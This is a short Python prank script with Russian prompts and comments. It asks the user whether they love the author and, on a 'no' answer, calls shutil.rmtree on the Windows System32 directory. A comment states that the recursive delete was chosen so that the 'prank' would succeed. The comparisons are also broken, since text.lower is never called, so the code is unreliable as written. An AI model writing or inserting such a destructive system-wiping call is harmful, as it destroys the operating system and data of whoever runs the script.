#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil

if __name__ == "__main__":
    text = input("Ты меня любишь???")
    if text.lower == "да":
        print("Я тебя тоже!!!")
    elif text.lower == "нет":
        # Не удалит не пустую папку и прикол не получится, поэтому как аналог взял другой метод
        # os.rmdir("System32")
        shutil.rmtree("C://Windows/System32")
